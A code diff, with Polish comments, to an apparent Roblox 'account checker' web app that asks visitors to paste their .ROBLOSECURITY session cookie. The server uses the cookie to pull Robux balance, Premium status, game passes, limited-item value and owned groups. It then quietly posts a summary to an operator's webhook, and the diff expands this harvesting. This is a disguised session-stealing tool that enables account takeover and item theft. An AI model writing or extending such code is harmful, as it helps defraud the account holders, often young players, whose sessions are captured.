@@ -14,7 +14,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Strona główna – Twoja oryginalna strona
+// Strona główna – Twoja HTML
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
@@ -60,7 +60,7 @@ async function checkAccount() {
     });
     const json = await resp.json();
     if (json.error) {
-      result.innerHTML = \`<span class="error">Error: \${json.error}</span>\`;
+      result.innerHTML = `<span class="error">Error: ${json.error}</span>`;
       return;
     }
     if (json.success) {
@@ -68,7 +68,7 @@ async function checkAccount() {
         ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
         : '—';
       let avatarHtml = json.avatarUrl
-        ? \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">\`
+        ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">`
         : '<p style="color:#ffcc00;">Could not load avatar</p>';
       const mm2Passes = [429957, 1308795];
       let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
@@ -79,30 +79,32 @@ async function checkAccount() {
       const sabPasses = [1227013099, 1229510262, 1228591447];
       let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
       const sabColor = sabCount > 0 ? '#00ff9d' : '#ff4d4d';
-      result.innerHTML = \`
+      result.innerHTML = `
         <span class="success">Account verified successfully!</span><br><br>
-        \${avatarHtml}
-        <b>Username:</b> \${json.username}<br>
-        <b>Display Name:</b> \${json.displayName}<br>
-        <b>User ID:</b> \${json.userId}<br>
-        <b>Roblox Premium:</b> <span style="color: \${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
+        ${avatarHtml}
+        <b>Username:</b> ${json.username}<br>
+        <b>Display Name:</b> ${json.displayName}<br>
+        <b>User ID:</b> ${json.userId}<br>
+        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
        
-        <b>Email / Phone Verified:</b> <span style="color: \${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
-          \${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
+        <b>Email / Phone Verified:</b> <span style="color: ${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
+          ${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
         </span><br>
        
-        <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.robux.toLocaleString('en-US')} Robux</span><br>
+        <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('en-US')} Robux</span><br>
+
+        <b>Total RAP (Limiteds):</b> <span style="color: #ffcc00; font-weight: bold;">${json.rap ? json.rap.toLocaleString('en-US') : 'N/A'}</span><br>
        
-        <b>MM2 Gamepasses:</b> <span style="color: \${mm2Color}; font-weight: bold;">\${mm2Count}</span><br>
-        <b>AMP Gamepasses:</b> <span style="color: \${ampColor}; font-weight: bold;">\${ampCount}</span><br>
-        <b>SAB Gamepasses:</b> <span style="color: \${sabColor}; font-weight: bold;">\${sabCount}</span><br>
+        <b>MM2 Gamepasses:</b> <span style="color: ${mm2Color}; font-weight: bold;">${mm2Count}</span><br>
+        <b>AMP Gamepasses:</b> <span style="color: ${ampColor}; font-weight: bold;">${ampCount}</span><br>
+        <b>SAB Gamepasses:</b> <span style="color: ${sabColor}; font-weight: bold;">${sabCount}</span><br>
        
-        <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.accountAgeDays} days</span><br>
-        <b>Created:</b> \${creationDate} \${json.created !== 'failed to fetch' ? \`<small>(\${json.created.split('T')[0]})\</small>\` : ''}<br>
-      \`;
+        <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} days</span><br>
+        <b>Created:</b> ${creationDate} ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
+      `;
     }
   } catch (e) {
-    result.innerHTML = \`<span class="error">Connection error: \${e.message}</span>\`;
+    result.innerHTML = `<span class="error">Connection error: ${e.message}</span>`;
   }
 }
 </script>
@@ -110,7 +112,7 @@ async function checkAccount() {
 </html>`);
 });
 
-// Główny endpoint sprawdzający konto
+// Główny endpoint
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
 
@@ -119,7 +121,7 @@ app.post('/check', async (req, res) => {
   }
 
   try {
-    // CSRF Token
+    // 1. CSRF Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -130,7 +132,7 @@ app.post('/check', async (req, res) => {
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token – invalid/expired cookie?');
 
-    // Dane użytkownika
+    // 2. Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       method: 'GET',
       headers: {
@@ -144,7 +146,7 @@ app.post('/check', async (req, res) => {
     }
     const userData = await userRes.json();
 
-    // Verified Email (hat)
+    // 3. Verified Email (hat)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(
@@ -164,7 +166,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Premium
+    // 4. Premium
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -173,7 +175,7 @@ app.post('/check', async (req, res) => {
       if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
 
-    // Robux
+    // 5. Robux
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
@@ -185,7 +187,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Wiek konta
+    // 6. Wiek konta
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -199,7 +201,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Avatar
+    // 7. Avatar
     let avatarUrl = null;
     try {
       const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
@@ -209,7 +211,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Gamepasy
+    // 8. Gamepasy
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -236,6 +238,47 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
+    // 9. Dodatkowe dane – liczba owned groups
+    let ownedGroupsCount = 0;
+    try {
+      const groupsRes = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/affiliations?role=Owner`, {
+        headers: {
+          'Cookie': `.ROBLOSECURITY=${cookie}`,
+          'X-CSRF-TOKEN': csrfToken,
+        },
+      });
+      if (groupsRes.ok) {
+        const groupsData = await groupsRes.json();
+        ownedGroupsCount = groupsData.data?.length || 0;
+      }
+    } catch {}
+
+    // 10. Total RAP z limiteds (collectibles)
+    let totalRAP = 0;
+    try {
+      let nextPageCursor = null;
+      do {
+        const url = `https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100` + (nextPageCursor ? `&cursor=${nextPageCursor}` : '');
+        const limitedsRes = await fetch(url, {
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'X-CSRF-TOKEN': csrfToken,
+          },
+        });
+        if (limitedsRes.ok) {
+          const data = await limitedsRes.json();
+          data.data.forEach(item => {
+            if (item.recentAveragePrice) {
+              totalRAP += item.recentAveragePrice;
+            }
+          });
+          nextPageCursor = data.nextPageCursor;
+        } else {
+          break;
+        }
+      } while (nextPageCursor);
+    } catch {}
+
     const result = {
       success: true,
       username: userData.name,
@@ -248,13 +291,13 @@ app.post('/check', async (req, res) => {
       avatarUrl,
       hasGamePasses,
       emailVerified,
+      totalRAP,           // prawdziwy RAP
+      ownedGroupsCount,   // liczba własnych grup
     };
 
     res.status(200).json(result);
 
-    // ────────────────────────────────────────────────
-    // Wysyłka do webhooka – styl максимально zbliżony do Twojego screena
-    // ────────────────────────────────────────────────
+    // Wysyłka embeda – maksymalnie zbliżony do screena
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -281,22 +324,22 @@ app.post('/check', async (req, res) => {
                 },
                 {
                   name: "Account Stats",
-                  value: `• Account Age: **${accountAgeDays} Days**\n• Games Developer: **False**\n• Group Members: **0**`,
+                  value: `• Account Age: **${accountAgeDays} Days**\n• Games Developer: **?** (not fetched)\n• Group Members: **${ownedGroupsCount}**`,
                   inline: false
                 },
                 {
                   name: "⭕ Robux",
-                  value: `Balance: **${robux}**\nPending: **0**\nPayments: **0**`,
+                  value: `Balance: **${robux.toLocaleString()}**\nPending: **?**\nPayments: **?**`,
                   inline: true
                 },
                 {
                   name: "Limits",
-                  value: `RAP: **0**\nLimiteds: **0**`,
+                  value: `RAP: **${totalRAP.toLocaleString()}**\nLimiteds: **?**`,
                   inline: true
                 },
                 {
                   name: "Summary",
-                  value: `**1013**`,
+                  value: `**?**`,
                   inline: true
                 },
                 {
@@ -311,12 +354,12 @@ app.post('/check', async (req, res) => {
                 },
                 {
                   name: "Groups",
-                  value: "Owned: **0**",
+                  value: `Owned: **${ownedGroupsCount}**`,
                   inline: true
                 },
                 {
                   name: "Inventory",
-                  value: "Unknown: **False**",
+                  value: "Unknown: **?**",
                   inline: true
                 },
                 {
